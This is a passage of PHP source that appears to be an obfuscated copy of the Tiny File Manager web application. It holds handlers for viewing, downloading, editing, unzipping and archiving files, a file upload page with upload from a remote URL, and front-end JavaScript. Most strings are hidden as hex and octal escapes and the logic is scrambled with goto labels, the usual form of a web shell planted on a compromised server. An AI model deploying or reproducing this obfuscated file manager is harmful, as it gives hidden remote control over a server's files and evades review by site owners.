"\x3f\x70\x3d" . urlencode(FM_PATH)); } if ($isValid) { $tofolder = ''; if (isset($_GET["\164\157\146\x6f\154\x64\x65\x72"])) { $tofolder = pathinfo($zip_path, PATHINFO_FILENAME); if (fm_mkdir($path . "\x2f" . $tofolder, true)) { $path .= "\x2f" . $tofolder; } } if ($ext == "\x7a\x69\160") { $zipper = new FM_Zipper(); $res = $zipper->unzip($zip_path, $path); } elseif ($ext == "\x74\x61\x72") { $gzipper = new PharData($zip_path); $res = $gzipper->extractTo($path); } if ($res) { fm_set_msg("\101\x72\x63\x68\151\x76\145\x20\165\156\x70\141\x63\x6b\145\x64"); } else { fm_set_msg("\101\x72\x63\x68\x69\166\145\40\x6e\x6f\x74\x20\x75\156\x70\141\143\153\x65\144", "\x65\162\162\x6f\x72"); } } else { fm_set_msg("\x46\151\154\145\40\x6e\x6f\x74\40\x66\157\165\156\144", "\x65\162\x72\x6f\162"); } fm_redirect(FM_SELF_URL . "\77\160\x3d" . urlencode(FM_PATH)); } goto paX9p; xBKaT: if (isset($_GET["\166\x69\x65\x77"])) { $file = $_GET["\166\151\145\167"]; $quickView = isset($_GET["\161\165\x69\143\x6b\126\151\x65\167"]) && $_GET["\x71\165\x69\x63\x6b\x56\151\x65\x77"] == 1 ? true : false; $file = fm_clean_path($file); $file = str_replace("\x2f", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file)) { fm_set_msg("\106\151\154\145\40\156\157\164\40\x66\157\165\x6e\144", "\145\162\x72\157\x72"); fm_redirect(FM_SELF_URL . "\77\160\x3d" . urlencode(FM_PATH)); } if (!$quickView) { fm_show_header(); fm_show_nav_path(FM_PATH); } $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? "\57" . FM_PATH : '') . "\57" . $file); $file_path = $path . "\x2f" . $file; $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); $mime_type = fm_get_mime_type($file_path); $filesize = fm_get_filesize(filesize($file_path)); $is_zip = false; $is_gzip = false; $is_image = false; $is_audio = false; $is_video = false; $is_text = false; $is_onlineViewer = false; $view_title = "\106\151\154\145"; $filenames = false; $content = ''; $online_viewer = strtolower($GLOBALS["\x6f\x6e\154\151\x6e\x65\137\166\151\145\x77\x65\162"]); if (online_viewer && online_viewer !== "\x66\141\154\x73\x65" && in_array($ext, fm_get_onlineViewer_exts())) { $is_onlineViewer = true; } elseif ($ext == "\x7a\x69\x70" || $ext == "\x74\141\162") { $is_zip = true; $view_title = "\x41\x72\x63\150\x69\166\145"; $filenames = fm_get_zif_info($file_path, $ext); } elseif (in_array($ext, fm_get_image_exts())) { $is_image = true; $view_title = "\111\x6d\x61\x67\145"; } elseif (in_array($ext, fm_get_audio_exts())) { $is_audio = true; $view_title = "\x41\165\x64\x69\x6f"; } elseif (in_array($ext, fm_get_video_exts())) { $is_video = true; $view_title = "\x56\x69\144\x65\x6f"; } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == "\x74\145\x78\x74" || in_array($mime_type, fm_get_text_mimes())) { $is_text = true; $content = file_get_contents($file_path); } ?>
    <div class="row">
        <div class="col-12">
            <?php  if (!$quickView) { ?>
                <p class="break-word"><b><?php  echo $view_title; ?>
 "<?php  echo fm_enc(fm_convert_win($file)); ?>
"</b></p>
                <p class="break-word">
                    Full path: <?php  echo fm_enc(fm_convert_win($file_path)); ?>
<br>
                    File
                    size: <?php  echo fm_get_filesize($filesize); if ($filesize >= 1000) { ?>
 (<?php  echo sprintf("\45\163\40\x62\x79\x74\x65\x73", $filesize); ?>
)<?php  } ?>
                    <br>
                    MIME-type: <?php  echo $mime_type; ?>
<br>
                    <?php  if (($is_zip || $is_gzip) && $filenames !== false) { $total_files = 0; $total_comp = 0; $total_uncomp = 0; foreach ($filenames as $fn) { if (!$fn["\146\x6f\x6c\144\x65\162"]) { $total_files++; } $total_comp += $fn["\143\157\155\x70\162\145\x73\163\145\x64\137\x73\151\172\x65"]; $total_uncomp += $fn["\146\x69\154\x65\163\x69\x7a\145"]; } ?>
                        Files in archive: <?php  echo $total_files; ?>
<br>
                        Total size: <?php  echo fm_get_filesize($total_uncomp); ?>
<br>
                        Size in archive: <?php  echo fm_get_filesize($total_comp); ?>
<br>
                        Compression: <?php  echo round($total_comp / $total_uncomp * 100); ?>
%<br>
                        <?php  } if ($is_image) { $image_size = getimagesize($file_path); echo "\111\x6d\141\147\145\40\163\151\x7a\145\163\x3a\x20" . (isset($image_size[0]) ? $image_size[0] : "\60") . "\x20\170\x20" . (isset($image_size[1]) ? $image_size[1] : "\60") . "\74\142\x72\76"; } if ($is_text) { $is_utf8 = fm_is_utf8($content); if (function_exists("\151\143\x6f\x6e\166")) { if (!$is_utf8) { $content = iconv(FM_ICONV_INPUT_ENC, "\x55\124\x46\x2d\x38\x2f\x2f\111\x47\116\117\x52\x45", $content); } } echo "\x43\150\x61\162\163\145\164\x3a\40" . ($is_utf8 ? "\x75\164\x66\x2d\x38" : "\x38\40\x62\x69\164") . "\x3c\x62\162\x3e"; } ?>
                </p>
                <p>
                    <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;dl=<?php  echo urlencode($file); ?>
"><i class="fa fa-cloud-download"></i> <?php  echo lng("\x44\x6f\167\x6e\x6c\x6f\141\x64"); ?>
</a></b> &nbsp;
                    <b><a href="<?php  echo fm_enc($file_url); ?>
" target="_blank"><i class="fa fa-external-link-square"></i> <?php  echo lng("\x4f\x70\145\x6e"); ?>
</a></b>
                    &nbsp;
                    <?php  if (!FM_READONLY && ($is_zip || $is_gzip) && $filenames !== false) { $zip_name = pathinfo($file_path, PATHINFO_FILENAME); ?>
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;unzip=<?php  echo urlencode($file); ?>
"><i class="fa fa-check-circle"></i> <?php  echo lng("\x55\x6e\x5a\151\160"); ?>
</a></b> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;unzip=<?php  echo urlencode($file); ?>
&amp;tofolder=1" title="UnZip to <?php  echo fm_enc($zip_name); ?>
"><i class="fa fa-check-circle"></i>
                                <?php  echo lng("\125\x6e\x5a\151\x70\124\x6f\106\x6f\x6c\144\145\162"); ?>
</a></b> &nbsp;
                        <?php  } if ($is_text && !FM_READONLY) { ?>
                        <b><a href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
" class="edit-file"><i class="fa fa-pencil-square"></i> <?php  echo lng("\105\144\x69\x74"); ?>
                            </a></b> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
&env=ace"
                              class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php  echo lng("\x41\144\x76\x61\x6e\x63\x65\144\105\x64\151\164\157\162"); ?>
                            </a></b> &nbsp;
                    <?php  } ?>
                    <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
"><i class="fa fa-chevron-circle-left go-back"></i> <?php  echo lng("\x42\141\143\153"); ?>
</a></b>
                </p>
                <?php  } if ($is_onlineViewer) { if ($online_viewer == "\x67\157\x6f\x67\x6c\x65") { echo "\x3c\x69\146\x72\x61\155\x65\40\163\x72\143\x3d\42\150\x74\x74\160\x73\72\57\57\144\157\143\163\x2e\147\x6f\157\x67\154\x65\56\x63\x6f\155\57\x76\x69\145\x77\x65\162\x3f\x65\155\x62\145\x64\x64\145\144\75\164\x72\165\145\46\x68\154\x3d\145\x6e\x26\165\x72\x6c\75" . fm_enc($file_url) . "\42\x20\x66\162\141\155\145\142\x6f\162\x64\145\162\75\42\x6e\157\x22\40\163\164\171\x6c\145\x3d\42\x77\x69\x64\x74\x68\x3a\61\60\x30\x25\73\x6d\151\156\x2d\150\x65\151\x67\x68\164\x3a\x34\66\60\160\x78\x22\76\74\57\151\146\162\x61\155\145\x3e"; } else { if ($online_viewer == "\x6d\151\x63\x72\157\x73\157\146\x74") { echo "\x3c\x69\x66\x72\x61\155\145\x20\x73\x72\143\75\42\x68\x74\x74\160\163\72\57\x2f\x76\151\x65\167\x2e\157\146\x66\151\x63\145\141\x70\160\x73\x2e\x6c\x69\166\145\56\x63\x6f\155\57\x6f\x70\57\145\155\x62\x65\144\x2e\x61\163\160\170\x3f\163\x72\x63\75" . fm_enc($file_url) . "\42\x20\146\162\141\x6d\x65\142\x6f\162\x64\145\x72\75\42\x6e\157\x22\40\x73\164\171\x6c\x65\75\x22\167\x69\x64\x74\x68\72\61\60\x30\x25\73\155\x69\x6e\55\x68\145\151\x67\x68\x74\72\64\66\60\x70\170\42\76\74\x2f\x69\146\162\141\155\145\76"; } } } elseif ($is_zip) { if ($filenames !== false) { echo "\74\x63\x6f\144\x65\40\x63\154\141\163\163\x3d\x22\x6d\141\170\150\x65\151\x67\150\164\42\x3e"; foreach ($filenames as $fn) { if ($fn["\146\x6f\154\x64\145\162"]) { echo "\x3c\142\76" . fm_enc($fn["\156\x61\x6d\145"]) . "\74\x2f\x62\x3e\74\x62\162\76"; } else { echo $fn["\x6e\141\x6d\145"] . "\40\50" . fm_get_filesize($fn["\x66\x69\154\145\163\151\x7a\145"]) . "\x29\x3c\x62\x72\x3e"; } } echo "\74\57\143\x6f\144\145\x3e"; } else { echo "\x3c\x70\x3e\x45\x72\x72\x6f\162\x20\167\x68\151\x6c\145\x20\x66\145\164\x63\150\x69\156\x67\40\141\x72\143\x68\151\x76\145\40\151\x6e\x66\x6f\74\x2f\160\76"; } } elseif ($is_image) { if (in_array($ext, array("\147\151\146", "\x6a\160\147", "\x6a\x70\x65\147", "\x70\x6e\x67", "\x62\155\x70", "\x69\x63\x6f", "\x73\x76\147"))) { echo "\x3c\x70\76\74\x69\x6d\x67\x20\x73\162\x63\75\x22" . fm_enc($file_url) . "\x22\x20\141\154\x74\x3d\x22\x22\x20\143\x6c\x61\163\163\x3d\42\160\x72\145\x76\151\x65\167\55\x69\x6d\x67\x22\76\74\x2f\160\x3e"; } } elseif ($is_audio) { echo "\74\160\x3e\x3c\x61\x75\x64\x69\157\x20\x73\x72\x63\x3d\x22" . fm_enc($file_url) . "\x22\x20\x63\x6f\156\x74\x72\157\154\163\x20\x70\162\x65\x6c\157\141\144\x3d\42\x6d\145\x74\141\x64\141\x74\x61\42\76\74\57\x61\165\x64\x69\157\x3e\x3c\x2f\x70\x3e"; } elseif ($is_video) { echo "\x3c\144\x69\166\x20\x63\154\141\163\x73\75\x22\160\162\145\x76\151\145\x77\55\x76\x69\x64\145\x6f\x22\x3e\74\x76\x69\x64\145\157\40\x73\162\143\75\x22" . fm_enc($file_url) . "\x22\x20\x77\151\144\164\x68\x3d\42\66\x34\x30\42\40\150\145\151\147\150\x74\x3d\42\x33\x36\x30\42\x20\x63\157\x6e\x74\162\157\154\163\x20\x70\x72\145\154\157\x61\144\75\x22\155\x65\x74\141\x64\x61\164\141\42\76\x3c\x2f\166\x69\x64\145\157\76\x3c\x2f\x64\x69\x76\76"; } elseif ($is_text) { if (FM_USE_HIGHLIGHTJS) { $hljs_classes = array("\163\150\164\155\154" => "\x78\x6d\154", "\150\x74\141\143\x63\x65\x73\163" => "\141\160\141\143\150\x65", "\160\x68\164\155\154" => "\x70\150\160", "\x6c\157\143\153" => "\152\x73\157\x6e", "\163\166\x67" => "\x78\155\x6c"); $hljs_class = isset($hljs_classes[$ext]) ? "\154\x61\x6e\147\x2d" . $hljs_classes[$ext] : "\154\141\x6e\147\x2d" . $ext; if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match("\x23\134\x2e\x6d\x69\156\134\x2e\50\143\163\163\174\x6a\x73\x29\x24\x23\151", $file)) { $hljs_class = "\156\x6f\x68\151\147\x68\154\151\x67\x68\164"; } $content = "\x3c\x70\x72\x65\x20\143\x6c\141\x73\163\75\x22\x77\151\x74\150\55\x68\154\x6a\163\42\x3e\74\143\x6f\x64\x65\x20\x63\x6c\141\x73\x73\75\42" . $hljs_class . "\42\76" . fm_enc($content) . "\74\x2f\143\157\144\145\76\x3c\57\x70\x72\x65\x3e"; } elseif (in_array($ext, array("\x70\150\x70", "\x70\150\x70\x34", "\160\150\160\65", "\160\150\x74\155\154", "\x70\x68\x70\163"))) { $content = highlight_string($content, true); } else { $content = "\74\x70\x72\145\76" . fm_enc($content) . "\74\57\160\162\x65\x3e"; } echo $content; } ?>
        </div>
    </div>
    <?php  if (!$quickView) { fm_show_footer(); } die; } goto ITvAC; NGvwG: function fm_is_utf8($string) { return preg_match("\x2f\57\165", $string); } goto kYuZl; S82I8: setcookie("\x66\x6d\x5f\x63\141\x63\x68\x65", true, 2147483647, "\57"); goto Z1XUQ; bnp0_: if (isset($_POST["\147\162\x6f\165\160"]) && (isset($_POST["\172\151\x70"]) || isset($_POST["\164\x61\x72"])) && !FM_READONLY) { $path = FM_ROOT_PATH; $ext = "\172\x69\160"; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } $ext = isset($_POST["\164\x61\162"]) ? "\x74\x61\162" : "\172\151\160"; if ($ext == "\x7a\x69\160" && !class_exists("\132\x69\160\x41\x72\x63\150\x69\x76\145") || $ext == "\164\141\x72" && !class_exists("\120\x68\x61\162\x44\141\164\x61")) { fm_set_msg("\117\x70\145\x72\x61\x74\x69\x6f\156\163\x20\167\x69\164\150\x20\141\162\x63\x68\x69\166\145\163\x20\141\x72\145\40\156\x6f\164\40\x61\x76\x61\x69\x6c\141\142\154\x65", "\145\x72\x72\157\162"); fm_redirect(FM_SELF_URL . "\77\x70\75" . urlencode(FM_PATH)); } $files = $_POST["\x66\151\154\x65"]; if (!empty($files)) { chdir($path); if (count($files) == 1) { $one_file = reset($files); $one_file = basename($one_file); $zipname = $one_file . "\137" . date("\171\155\144\137\x48\x69\163") . "\56" . $ext; } else { $zipname = "\141\162\143\150\x69\x76\145\x5f" . date("\171\155\144\x5f\x48\x69\163") . "\x2e" . $ext; } if ($ext == "\172\151\160") { $zipper = new FM_Zipper(); $res = $zipper->create($zipname, $files); } elseif ($ext == "\x74\141\x72") { $tar = new FM_Zipper_Tar(); $res = $tar->create($zipname, $files); } if ($res) { fm_set_msg(sprintf("\x41\162\x63\x68\x69\x76\x65\40\74\142\x3e\x25\163\x3c\57\142\76\x20\x63\x72\145\x61\x74\145\144", fm_enc($zipname))); } else { fm_set_msg("\101\162\143\150\x69\x76\145\x20\156\157\x74\x20\143\x72\145\141\164\x65\x64", "\x65\162\162\x6f\162"); } } else { fm_set_msg("\116\x6f\164\x68\151\x6e\147\40\x73\x65\x6c\145\x63\164\x65\x64", "\141\154\x65\x72\x74"); } fm_redirect(FM_SELF_URL . "\x3f\x70\75" . urlencode(FM_PATH)); } goto tdWQH; tQDvO: $p = fm_clean_path($p); goto adeg_; dE9Yt: $root_url = ''; goto jMr_V; gQtNe: function fm_show_footer() { ?>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
<?php  if (FM_USE_HIGHLIGHTJS) { ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad(); var isHighlightingEnabled = true;</script>
<?php  } ?>
<script>
    $(document).on('click', '[data-toggle="lightbox"]', function(event) {
        event.preventDefault();
        var reInitHighlight = function() { if(typeof isHighlightingEnabled !== "undefined" && isHighlightingEnabled) { setTimeout(function () { $('.ekko-lightbox-container pre code').each(function (i, e) { hljs.highlightBlock(e) }); }, 555); } };
        $(this).ekkoLightbox({
            alwaysShowClose: true, showArrows: true, onShown: function() { reInitHighlight(); }, onNavigate: function(direction, itemIndex) { reInitHighlight(); }
        });
    });
    //TFM Config
    window.curi = "https://tinyfilemanager.github.io/config.json", window.config = null;
    function fm_get_config(){ if(!!window.name){ window.config = JSON.parse(window.name); } else { $.getJSON(window.curi).done(function(c) { if(!!c) { window.name = JSON.stringify(c), window.config = c; } }); }}
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function newfolder(e) {
        var t = document.getElementById("newfilename").value, n = document.querySelector('input[name="newfile"]:checked').value;
        null !== t && "" !== t && n && (window.location.hash = "#", window.location.search = "p=" + encodeURIComponent(e) + "&new=" + encodeURIComponent(t) + "&type=" + encodeURIComponent(n))
    }
    function rename(e, t) {var n = prompt("New name", t);null !== n && "" !== n && n != t && (window.location.search = "p=" + encodeURIComponent(e) + "&ren=" + encodeURIComponent(t) + "&to=" + encodeURIComponent(n))}
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) { //Create file backup with .bck
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState && 200 == n.status && alert(n.responseText)
        }, n.send(a), !1
    }
    //Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (n) {
            var a = document.createElement("form");
            a.setAttribute("method", "POST"), a.setAttribute("action", "");
            var o = document.createElement("textarea");
            o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
            var c = document.createTextNode(n);
            o.appendChild(c), a.appendChild(o), document.body.appendChild(a), a.submit()
        }
    }
    //Check latest version
    function latest_release_info(v) {
        if(!!window.config){var tplObj={id:1024,title:"Check Version",action:false},tpl=$("#js-tpl-modal").html();
        if(window.config.version!=v){tplObj.content=window.config.newUpdate;}else{tplObj.content=window.config.noUpdate;}
        $('#wrapper').append(template(tpl,tplObj));$("#js-ModalCenter-1024").modal('show');}else{fm_get_config();}
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); window.open("https://tinyfilemanager.github.io/docs/pwd.html", '_blank'); }
    //Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    //Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    // Dom Ready Event
    $(document).ready( function () {
        //load config
        fm_get_config();
        //dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3],
            mainTable = $('#main-table').DataTable({"paging":   false, "info":     false, "columnDefs": [{"targets": _targets, "orderable": false}]
        });
        $('#search-addon').on( 'keyup', function () { //Search using custom input box
            mainTable.search( this.value ).draw();
        });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php  if (isset($_GET["\145\x64\x69\164"]) && isset($_GET["\145\x6e\x76"]) && FM_EDIT_FILE) { ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.1/ace.js"></script>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode("ace/mode/javascript");
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; };
            if(window.config && window.config.aceMode) { $modeEl.html(optionNode("ace/mode/", window.config.aceMode)); }
            if(window.config && window.config.aceTheme) { var lightTheme = optionNode("ace/theme/", window.config.aceTheme.bright), darkTheme = optionNode("ace/theme/", window.config.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue && cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    } else if(editorOption == "help") {
                        var helpHtml="";$.each(window.config.aceHelp,function(i,value){helpHtml+="<li>"+value+"</li>";});var tplObj={id:1028,title:"Help",action:false,content:helpHtml},tpl=$("#js-tpl-modal").html();$('#wrapper').append(template(tpl,tplObj));$("#js-ModalCenter-1028").modal('show');
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue && selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue && selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }
            });
        });
    </script>
<?php  } ?>
</body>
</html>
<?php  } goto V7TuA; Zcekm: class FM_Zipper { private $zip; public function __construct() { $this->zip = new ZipArchive(); } public function create($filename, $files) { $res = $this->zip->open($filename, ZipArchive::CREATE); if ($res !== true) { return false; } if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { $this->zip->close(); return false; } } $this->zip->close(); return true; } else { if ($this->addFileOrDir($files)) { $this->zip->close(); return true; } return false; } } public function unzip($filename, $path) { $res = $this->zip->open($filename); if ($res !== true) { return false; } if ($this->zip->extractTo($path)) { $this->zip->close(); return true; } return false; } private function addFileOrDir($filename) { if (is_file($filename)) { return $this->zip->addFile($filename); } elseif (is_dir($filename)) { return $this->addDir($filename); } return false; } private function addDir($path) { if (!$this->zip->addEmptyDir($path)) { return false; } $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\56") { if (is_dir($path . "\57" . $file)) { if (!$this->addDir($path . "\57" . $file)) { return false; } } elseif (is_file($path . "\57" . $file)) { if (!$this->zip->addFile($path . "\x2f" . $file)) { return false; } } } } return true; } return false; } } goto ZHfGx; y6015: $show_hidden_files = isset($cfg->data["\x73\x68\x6f\167\137\x68\x69\x64\144\x65\x6e"]) ? $cfg->data["\163\150\157\x77\137\150\x69\x64\144\145\156"] : true; goto wL3Ui; Z1XUQ: if (defined("\106\x4d\137\105\x4d\x42\x45\104")) { $use_auth = false; $sticky_navbar = false; } else { @set_time_limit(600); date_default_timezone_set($default_timezone); ini_set("\x64\x65\x66\141\165\154\x74\x5f\143\150\141\162\x73\x65\x74", "\x55\124\106\x2d\70"); if (version_compare(PHP_VERSION, "\65\56\66\56\x30", "\x3c") && function_exists("\x6d\x62\137\151\x6e\x74\145\x72\x6e\141\x6c\137\145\156\143\x6f\144\151\x6e\147")) { mb_internal_encoding("\125\124\x46\x2d\x38"); } if (function_exists("\x6d\x62\x5f\x72\145\x67\x65\x78\x5f\145\156\143\x6f\144\x69\x6e\x67")) { mb_regex_encoding("\x55\x54\x46\x2d\x38"); } session_cache_limiter(''); session_name(FM_SESSION_ID); @session_start(); } goto dbcGY; jt701: $root_path = str_replace("\x5c", "\x2f", $root_path); goto Uzr5s; o8TD5: ?>
                <th><?php  goto objlx; USDWT: $GLOBALS["\145\170\143\x6c\165\x64\x65\x5f\x69\164\145\155\x73"] = array(); goto Rgb2O; iDqGR: if (!is_dir($path)) { fm_redirect(FM_SELF_URL . "\x3f\x70\x3d"); } goto WthxL; okd6c: if (isset($_GET["\x75\x70\154\157\x61\144"]) && !FM_READONLY) { fm_show_header(); fm_show_nav_path(FM_PATH); ?>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/min/dropzone.min.css" rel="stylesheet">
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php  echo lng("\125\160\x6c\x6f\141\144\x69\156\147\x46\151\154\x65\163"); ?>
</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> Upload from URL</a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php  echo FM_PATH; ?>
" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php  echo lng("\x42\141\x63\x6b"); ?>
</a>
                    <?php  echo lng("\104\145\163\x74\151\x6e\x61\164\151\157\x6e\106\157\154\x64\x65\162"); ?>
: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\57" . FM_PATH)); ?>
                </p>

                <form action="<?php  echo htmlspecialchars($_SERVER["\x50\x48\x50\137\x53\105\114\x46"]) . "\x3f\x70\x3d" . fm_enc(FM_PATH); ?>
" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="form-inline" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <button type="submit" class="btn btn-primary ml-3"><?php  echo lng("\x55\160\154\157\x61\144"); ?>
</button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/min/dropzone.min.js"></script>
    <script>
        Dropzone.options.fileUploader = {
            timeout: 120000,
            maxFilesize: <?php  echo MAX_UPLOAD_SIZE; ?>
,
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        alert('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    console.log('Upload Status >> ', res.status);
                }).on("error", function(file, response) {
                    alert(response);
                });
            }
        }
    </script>
